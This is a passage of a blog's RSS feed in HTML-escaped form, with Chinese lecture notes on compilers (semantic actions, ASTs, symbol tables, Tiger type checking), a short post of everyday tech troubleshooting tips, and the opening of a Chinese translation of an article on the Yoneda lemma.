&lt;/li&gt;
&lt;li&gt;应用：&lt;ul&gt;
&lt;li&gt;“推导类”：例如很多语言的&lt;strong&gt;编译期求值&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;“生成类”：生成AST， 中间代码等&lt;/li&gt;
&lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;实现：例如在先前章节中Yacc等Parser生成器的&lt;strong&gt;语义动作&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;语义动作Semantic-Action&#34;&gt;&lt;a href=&#34;#语义动作Semantic-Action&#34; class=&#34;headerlink&#34; title=&#34;语义动作Semantic Action&#34;&gt;&lt;/a&gt;语义动作Semantic Action&lt;/h3&gt;&lt;p&gt;我们可以给产生式绑定一个语义动作，使得按照这个产生式规约时&amp;#x2F;推导时完成特定操作。&lt;/p&gt;
&lt;p&gt;每个token都可能有独属于自己的**语义值(Semantic Value)**。每种token的语义值类型可以不同，我们把A的语义值的类型称为“A的关联类型”。&lt;br&gt;例如对于产生式 $A\rightarrow B\ C\ D$&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;语义动作返回值必须是&lt;em&gt;A的关联类型&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;这个值可以通过B C D各自的语义值进行运算得出&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;例如我们通过如下语义动作可以在编译期直接evaluate表达式的值：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;E-&amp;gt;E1 + T   &amp;#123; E.val= E1.val + T.val &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;E-&amp;gt;E1 – T   &amp;#123; E.val= E1.val -T.val &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;E-&amp;gt;T        &amp;#123; E.val= T.val &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;T-&amp;gt;(E)      &amp;#123; T.val= E.val &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;T-&amp;gt;num      &amp;#123; T.val= num.val &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在递归下降法中，语义动作体现为每个符号对应的parsing函数。这里我们同时关心函数的&lt;strong&gt;返回值&lt;/strong&gt;与&lt;strong&gt;副作用&lt;/strong&gt;。&lt;br&gt;因此假设T和F两个token的关联类型都是&lt;code&gt;int&lt;/code&gt;，对于表达式 $T\rightarrow T * F$ 我们可以如此实现语义动作：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a= T();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eat(TIMES); &lt;span class=&#34;comment&#34;&gt;// &amp;#x27;*&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; b= F();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; a*b;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;而对于Parser生成器来说，其实现方式有所不同，以Yacc为例：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用一个栈储存语义值，这个栈和状态栈是同步的&lt;/li&gt;
&lt;li&gt;当进行&lt;strong&gt;规约&lt;/strong&gt;操作时，需要执行相应的语义动作（C语言实现）&lt;ul&gt;
&lt;li&gt;可能用到的值一定可以通过多次pop语义值栈获得（和状态栈pop同步）&lt;/li&gt;
&lt;li&gt;pop完毕后运算得到的新值压入该栈（和状态栈压入新状态同步）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;抽象解析树Abstract-Parse-Tree&#34;&gt;&lt;a href=&#34;#抽象解析树Abstract-Parse-Tree&#34; class=&#34;headerlink&#34; title=&#34;抽象解析树Abstract Parse Tree&#34;&gt;&lt;/a&gt;抽象解析树Abstract Parse Tree&lt;/h3&gt;&lt;p&gt;语义动作的一种应用。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;⚠和抽象语法树(Abstract Syntax Tree)的区别请参阅&lt;a href=&#34;https://stackoverflow.com/questions/5026517/whats-the-difference-between-parse-trees-and-abstract-syntax-trees-asts&#34;&gt;https://stackoverflow.com/questions/5026517/whats-the-difference-between-parse-trees-and-abstract-syntax-trees-asts&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;能否&lt;strong&gt;通过描述语义动作直接实现整个编译器&lt;/strong&gt;？可以，但是难以维护，且必须保证这些语义值的计算顺序和Parsing顺序完全一致。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;考虑分离语法解析（Parsing）和语义动作：一个可行方案是Parsing得到树，而后遍历以进行语义相关的操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们可以很容易得到一棵树：叶节点对应输入的token，内部节点对应一个语法规则。这被称为&lt;strong&gt;concrete parse tree&lt;/strong&gt;.&lt;br&gt;&lt;img src=&#34;/compiler-construction-principles/concrete-pt.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;缺点：太“啰嗦”。例如括号相关产生式只是为了解析顺序正确才有的，没必要放进树里。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;抽象语法树Abstract-Syntax-Tree&#34;&gt;&lt;a href=&#34;#抽象语法树Abstract-Syntax-Tree&#34; class=&#34;headerlink&#34; title=&#34;抽象语法树Abstract Syntax Tree&#34;&gt;&lt;/a&gt;抽象语法树Abstract Syntax Tree&lt;/h3&gt;&lt;p&gt;可以提供一个&lt;em&gt;干净的&lt;/em&gt;（不包含Parsing的那些繁文缛节）接口用于后续编译流程的实现或优化（编译器后端）。&lt;br&gt;生成方式：用&lt;strong&gt;具体语法&lt;/strong&gt;（Parser生成器能懂的）为&lt;strong&gt;抽象语法&lt;/strong&gt;（我们想要的、更可读的）生成抽象语法树&lt;br&gt;&lt;img src=&#34;/compiler-construction-principles/AST.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;实现：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;为每一个非终结符定义一个类型声明，用于表示其关联类型&lt;/li&gt;
&lt;li&gt;产生式统一放进一个union（如果是Rust就是Option直接解决，&lt;del&gt;C语言太坏了&lt;/del&gt;）里，每一个产生式就是union里的一个结构体，这个结构体用于储存其子节点 &lt;img src=&#34;/compiler-construction-principles/AST-def.png&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;li&gt;为每个产生式定义一个函数，除了计算需要的语义值返回以外，还将申请空间、分配新的树节点并设置好其子节点 &lt;img src=&#34;/compiler-construction-principles/AST-impl.png&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;li&gt;以Yacc为例，把这些函数放入对应产生式的语义动作块中即可在规约时自动调用。随着Parsing的逐步推进，每次规约都可以产生一个新的内部节点，最终逐步构建出整颗AST&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此外，通过遍历AST还能做很多：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过一些“变形”缩小树的规模，减少最终代码的大小&lt;/li&gt;
&lt;li&gt;通过一些“变形”优化树的结构，提高最终代码的性能&lt;/li&gt;
&lt;li&gt;代码内联优化&lt;/li&gt;
&lt;li&gt;静态分析，编译期推导值&lt;/li&gt;
&lt;li&gt;类型系统检查等安全检查&lt;/li&gt;
&lt;li&gt;翻译到中间表示，虽然&lt;strong&gt;AST也常被视作一种“中间表示”&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;位置Position&#34;&gt;&lt;a href=&#34;#位置Position&#34; class=&#34;headerlink&#34; title=&#34;位置Position&#34;&gt;&lt;/a&gt;位置Position&lt;/h3&gt;&lt;p&gt;在one-pass编译器中，词法分析、语法分析、语义分析是同步进行的。而错误发生时，&lt;strong&gt;词法分析器lexer&lt;/strong&gt;的位置可以用来作为错误发生位置的合理估计反馈给用户。所以，lexer存有一个全局变量维护当前位置信息。&lt;/p&gt;
&lt;p&gt;然而，对于使用AST的编译器，词法分析结束后才开始语法分析，因此这是不可行的。&lt;br&gt;解决方案：AST每个节点记录自己在源文件中的&lt;strong&gt;位置&lt;/strong&gt;，标记自己是具体哪几个字符派生而来的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;lexer把每个token的起始位置、结束位置传递给parser&lt;/li&gt;
&lt;li&gt;parser维护&lt;em&gt;位置栈&lt;/em&gt;与&lt;em&gt;语义值栈&lt;/em&gt;，这样语义操作就知道位置信息了&lt;ul&gt;
&lt;li&gt;不是所有的Parser生成器都可以做到这一点：例如Bison可以但Yacc不行&lt;/li&gt;
&lt;li&gt;对于Yacc等无法直接实现的，可以引入新的非终结符pos（其语义值包含需要的位置信息）并改写文法。例如我们可以如此改写PLUS表达式以利用位置信息：&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;%&amp;#123; extern A_OpExp(A_exp, A_binop, A_exp, position); %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%union &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int num;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    string id;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    position pos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%type &amp;lt;pos&amp;gt; pos&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pos: &amp;#123; $$ = EM_tokpos; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exp: exp PLUS pos exp &amp;#123; $$ = A_OpExp($1, A_plus, $4, $3); &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;Part-8-语义分析&#34;&gt;&lt;a href=&#34;#Part-8-语义分析&#34; class=&#34;headerlink&#34; title=&#34;Part 8: 语义分析&#34;&gt;&lt;/a&gt;Part 8: 语义分析&lt;/h2&gt;&lt;p&gt;我们注意到上述的属性文法等内容只适用于上下文无关文法CFG.&lt;br&gt;然而CFG有很多不足，例如我们不可能完成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;检查数组引用的维度是否匹配&lt;/li&gt;
&lt;li&gt;检查数组越界&lt;/li&gt;
&lt;li&gt;确定变量应储存于栈上还是堆上&lt;/li&gt;
&lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这是因为，这些检查和值有关（涉及语义），而非语法本身。因此我们需要通过检查、遍历&lt;strong&gt;程序表示(Program Representation)&lt;strong&gt;来完成&lt;/strong&gt;（广义的）语义分析&lt;/strong&gt;。&lt;br&gt;常用的程序表示：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;abstract syntax tree (AST)&lt;/li&gt;
&lt;li&gt;control flow graph (CFG)&lt;/li&gt;
&lt;li&gt;programdependence graph (PDG)&lt;/li&gt;
&lt;li&gt;valueflowgraph (VFG)&lt;/li&gt;
&lt;li&gt;single static assignment (SSA)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;然后我们就可以：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;类型检查&lt;/li&gt;
&lt;li&gt;代码生成&lt;/li&gt;
&lt;li&gt;去除dead code&lt;/li&gt;
&lt;li&gt;寄存器分配&lt;/li&gt;
&lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在本课中，我们重点关注的（狭义的）语义分析指的是通过检查AST获知程序的静态属性，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;作用域(Scope)与变量可见性&lt;/li&gt;
&lt;li&gt;变量、函数、表达式的类型&lt;br&gt;以及将AST转为中间代码(Intermediate Code)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;符号表Symbol-Table&#34;&gt;&lt;a href=&#34;#符号表Symbol-Table&#34; class=&#34;headerlink&#34; title=&#34;符号表Symbol Table&#34;&gt;&lt;/a&gt;符号表Symbol Table&lt;/h3&gt;&lt;p&gt;Binding:&amp;#x3D; 把类型、值等信息绑定到一个identifier上&lt;br&gt;Environment:&amp;#x3D; 一些绑定的集合，体现了程序当前环境下已声明的一些变量&amp;#x2F;函数&amp;#x2F;…&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;符号表&lt;/strong&gt;就是Environment的一种实现方式。我们在遍历AST的过程中可以维护一个符号表用于语义分析。&lt;br&gt;符号表中的重要组成部分就是各个局部变量及其作用域。当退出作用域时，自然就需要丢弃内部的一些binding.&lt;br&gt;变量在scope内重新定义时需要覆盖（屏蔽）掉更大作用域的，退出时则还原。&lt;br&gt;因此可见我们需要为符号表实现的接口包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;insert: 将名称绑定到相关信息(type, value, …), 且将覆盖已有的绑定关系（如果存在）&lt;/li&gt;
&lt;li&gt;lookup: 用名称查找信息&lt;/li&gt;
&lt;li&gt;beginScope: 进入作用域&lt;/li&gt;
&lt;li&gt;endScope: 退出作用域，将符号表恢复到进入之前的状态&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在Java等语言中，可能有多个环境同时活跃（对应不同的module, class等），他们都需要一个符号表。这被称为多符号表。&lt;/p&gt;
&lt;h4 id=&#34;符号表的实现：Imperative-Style-Functional-Style&#34;&gt;&lt;a href=&#34;#符号表的实现：Imperative-Style-Functional-Style&#34; class=&#34;headerlink&#34; title=&#34;符号表的实现：Imperative Style &amp;amp; Functional Style&#34;&gt;&lt;/a&gt;符号表的实现：Imperative Style &amp;amp; Functional Style&lt;/h4&gt;&lt;p&gt;绑定时，如果遇到了符号已经存在的情况，我们有两种策略：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Imperative Style: 直接覆盖旧的绑定，这样我们不可能lookup到旧的信息。当这个新的绑定不再有效时，需要复原旧的绑定。&lt;ul&gt;
&lt;li&gt;如何快速lookup且支持删除和复原(restore): 使用哈希表套链表储存每对binding. 我们称哈希表中的元素为bucket&lt;/li&gt;
&lt;li&gt;insert: 直接插入对应bucket的链表头。如果已经存在，由于这使得新的binding关系更靠前，这样做可以成功覆盖&lt;/li&gt;
&lt;li&gt;restore: 对应bucket的链表头弹出头部的一些元素&lt;/li&gt;
&lt;li&gt;我们会发现需要维护一些必要的额外信息（比如scope变化时应该要弹出几次）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Functional Style: 永远保留老的，只是查询时做一些额外处理（可以理解为只是renaming）。这样还原更简单。&lt;ul&gt;
&lt;li&gt;直接使用BST（红黑树等）实现查找&lt;/li&gt;
&lt;li&gt;可以使用可持久化数据结构完成删除、复原等操作，进一步降低单次操作的空间复杂度，非常方便&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;两种方法均可使用。&lt;/p&gt;
&lt;h3 id=&#34;Tiger编译器符号相关的实现&#34;&gt;&lt;a href=&#34;#Tiger编译器符号相关的实现&#34; class=&#34;headerlink&#34; title=&#34;Tiger编译器符号相关的实现&#34;&gt;&lt;/a&gt;Tiger编译器符号相关的实现&lt;/h3&gt;&lt;p&gt;在哈希表中的链表进行lookup时，不断进行字符串比较是很耗时的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;解决办法：使用新的数据结构将符号对象关联到一个整数上（哈希值）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Tiger编译器的environment是destructive-update的。也就是说，我们有两个函数：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;S_beginScope&lt;/code&gt;: 记下当前符号表的状态&lt;/li&gt;
&lt;li&gt;&lt;code&gt;S_endScope&lt;/code&gt;: 恢复到最近的、还未被恢复的&lt;code&gt;S_beginScope&lt;/code&gt;记下的状态&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们引入一个**辅助栈(Auxiliary stack)**来维护上文提到的必要的额外信息:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;符号入栈时，会将binding联动地插入对应bucket的链表头&lt;/li&gt;
&lt;li&gt;弹出栈顶符号时，对应bucket的链表头也会联动地被移除&lt;/li&gt;
&lt;li&gt;beginScope: 压入一个特殊标记到辅助栈中&lt;/li&gt;
&lt;li&gt;endScope: 一直弹出符号直到弹出了一个特殊标记&lt;ul&gt;
&lt;li&gt;我们可以由此标记推断：此次因为退出scope引发的restore操作可以就此结束&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;类型检查&#34;&gt;&lt;a href=&#34;#类型检查&#34; class=&#34;headerlink&#34; title=&#34;类型检查&#34;&gt;&lt;/a&gt;类型检查&lt;/h3&gt;&lt;h4 id=&#34;类型及其作用&#34;&gt;&lt;a href=&#34;#类型及其作用&#34; class=&#34;headerlink&#34; title=&#34;类型及其作用&#34;&gt;&lt;/a&gt;类型及其作用&lt;/h4&gt;&lt;p&gt;类型限定了变量的取值范围以及部分运算规则。&lt;br&gt;可以大致把编程语言分为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;类型化的(typed): C&amp;#x2F;C++ Java Go&lt;/li&gt;
&lt;li&gt;非类型化的(untyped): LISP JavaScript&lt;ul&gt;
&lt;li&gt;不是没有类型，而是类型可变&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;作用：提高开发效率（高层抽象&amp;amp;指称语义），提高运行性能（指导编译优化），提高安全性（内存安全等）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;事实上，我们可以理解为每引入一种类型就能&lt;strong&gt;完全&lt;/strong&gt;消除某一类特定错误。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;形式化的类型系统可用于数学领域，参见Coq以及&lt;a href=&#34;https://leanprover-community.github.io/&#34;&gt;LEAN&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;Tiger的类型系统&#34;&gt;&lt;a href=&#34;#Tiger的类型系统&#34; class=&#34;headerlink&#34; title=&#34;Tiger的类型系统&#34;&gt;&lt;/a&gt;Tiger的类型系统&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;原始类型(primitive type): &lt;code&gt;int&lt;/code&gt;和&lt;code&gt;string&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;构造类型(constructed type): &lt;code&gt;record&lt;/code&gt;（类似结构体） 和&lt;code&gt;array&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;根据不同的判别法，&lt;strong&gt;类型等价&lt;/strong&gt;这一关系分为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Name equivalence (NE): 必须声明是同一个类型才是同一类型&lt;/li&gt;
&lt;li&gt;Structure equivalence (SE): “长得一样”（内部结构一样）就是同一类型&lt;br&gt;显然前者被广泛采用，Tiger语言也不例外。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Tiger存在两个独立的命名空间，不同命名空间的同名identifier不会互相遮蔽(hide)对方：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Types&lt;/li&gt;
&lt;li&gt;Functions and variables&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;Tiger的类型检查&#34;&gt;&lt;a href=&#34;#Tiger的类型检查&#34; class=&#34;headerlink&#34; title=&#34;Tiger的类型检查&#34;&gt;&lt;/a&gt;Tiger的类型检查&lt;/h4&gt;&lt;p&gt;Tiger的语义分析需要两个环境：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Type&lt;/code&gt;: 把类型符号映射到其表示的具体类型对应的数据结构&lt;ul&gt;
&lt;li&gt;初始时包含primitive type对应的映射 int $\mapsto$ Ty_int, string $\mapsto$ Ty_string,&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Value&lt;/code&gt;: 把变量名映射到具体类型，把函数名映射到(参数类型, 返回值类型)（也就是函数签名）&lt;ul&gt;
&lt;li&gt;初始时包含Tiger中预定义的一些函数定义&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;semant&lt;/code&gt;模块包含类型检查等语义分析相关操作。类型检查分为两部分：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Type-checking expressions&lt;ul&gt;
&lt;li&gt;&lt;code&gt;transExp&lt;/code&gt;可以在给定的两个环境下将输入的表达式标记上type（如果发现非法则报错）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Type-checking declarations&lt;ul&gt;
&lt;li&gt;在Tiger语言中声明只可能在&lt;code&gt;let&lt;/code&gt;语句中出现&lt;/li&gt;
&lt;li&gt;变量声明：如果提供了变量类型，则检查初始化表达式类型是否匹配；否则直接通过初始化表达式类型获得变量类型&lt;/li&gt;
&lt;li&gt;类型声明：&lt;strong&gt;递归地&lt;/strong&gt;获取类型别名对应的实际类型。&lt;ul&gt;
&lt;li&gt;Q: 如何处理递归声明 &lt;code&gt;type list = &amp;#123;first: int, rest: list&amp;#125;&lt;/code&gt;？A: 不使用one-pass而是two-pass: pass#1: 记录声明头部（左侧）放入环境；pass#2: 完成&lt;/li&gt;
&lt;li&gt;不允许类型的直接循环引用(&lt;code&gt;type a=b;type b=a&lt;/code&gt;)：必须通过record或array完成(&lt;code&gt;type a=b;type b=&amp;#123;i:a&amp;#125;&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;函数声明：检查形参、返回值与函数体&lt;ul&gt;
&lt;li&gt;Q: 如何处理递归声明？A: 不使用one-pass而是two-pass: pass#1: 记录函数声明（签名）放入环境；pass#2: 处理函数题&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;以上所有内容为期中考覆盖范围&lt;/em&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;&amp;gt;&amp;gt;&amp;gt; To be continued…&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;Part-9-活动记录Activation-Record&#34;&gt;&lt;a href=&#34;#Part-9-活动记录Activation-Record&#34; class=&#34;headerlink&#34; title=&#34;Part 9: 活动记录Activation Record&#34;&gt;&lt;/a&gt;Part 9: 活动记录Activation Record&lt;/h2&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2024/04/12/%E8%B5%9B%E5%8D%9A%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87%E8%8D%AF%E6%96%B9/</guid>
            <title>赛博疑难杂症药方</title>
            <link>http://cubicy.icu/2024/04/12/%E8%B5%9B%E5%8D%9A%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87%E8%8D%AF%E6%96%B9/</link>
            <category>Miscellaneous</category>
            <pubDate>Fri, 12 Apr 2024 01:45:01 +0800</pubDate>
            <description><![CDATA[ &lt;ul&gt;
&lt;li&gt;&lt;code&gt;git add .&lt;/code&gt; 仍有文件无法加入&lt;ul&gt;
&lt;li&gt;可能是submodule导致，即使删除子模块的&lt;code&gt;.git&lt;/code&gt;文件夹也不足够，还需要&lt;code&gt;git rm --cached&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;电脑怎样都没有声音，声卡等硬件均无问题，驱动没有更改过&lt;ul&gt;
&lt;li&gt;检查是否是Windows更新导致，可以回滚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;远程桌面出现奇奇怪怪的渲染问题$$&lt;ul&gt;
&lt;li&gt;可能是由于远程设备没有连接屏幕，需要保持屏幕开启；或者使用虚拟显示器（Virtual display）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/yoneda/</guid>
            <title>&lt;译&gt;Tai-Danae Bradley: 米田视角→米田嵌入→米田引理</title>
            <link>http://cubicy.icu/yoneda/</link>
            <category>Math</category>
            <category>Translation</category>
            <category>Yoneda Lemma</category>
            <pubDate>Mon, 08 Apr 2024 02:38:20 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;米田视角-→-米田嵌入-→-米田引理&#34;&gt;&lt;a href=&#34;#米田视角-→-米田嵌入-→-米田引理&#34; class=&#34;headerlink&#34; title=&#34;米田视角 → 米田嵌入 → 米田引理&#34;&gt;&lt;/a&gt;米田视角 → 米田嵌入 → 米田引理&lt;/h1&gt;&lt;p&gt;&lt;em&gt;注：本标题为译者添加。&lt;/em&gt;&lt;br&gt;原作者： &lt;a href=&#34;https://www.math3ma.com/about&#34;&gt;Tai-Danae Bradley&lt;/a&gt;&lt;br&gt;翻译： CubicY&lt;br&gt;部分图片与启发来源：&lt;a href=&#34;https://bartoszmilewski.com/2015/09/01/the-yoneda-lemma/trackback/&#34;&gt;Bartosz Milewski&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;译者序&#34;&gt;&lt;a href=&#34;#译者序&#34; class=&#34;headerlink&#34; title=&#34;译者序&#34;&gt;&lt;/a&gt;&lt;a name=&#34;prelude&#34;&gt;&lt;/a&gt;译者序&lt;/h2&gt;&lt;p&gt;米田引理(Yoneda Lemma)往往是新手在学习范畴论时遇到的第一个大障碍，犹如五十音图之于日语初学者。然而就译者本人看来，其难度并非来自于思维上的复杂，而更多来自于符号滥用（让人不禁想问数学整个领域是不是都这样）。尽管一些概念嵌套层数过多对思考确实造成了阻碍，但是通过无歧义的符号与生动的图示可以大大降低心智负担。本系列作者在这两点上都做得十分出色，故产生了将其译为中文的想法。我会将一些个人的理解以“译者注”的形式放置在文章各处。尽管如此，我仍然强烈推荐读者阅读原文。&lt;/p&gt;
&lt;p&gt;为了避免歧义，将本文使用的部分记号与约定列举在此：&lt;/p&gt;
&lt;ul&gt;
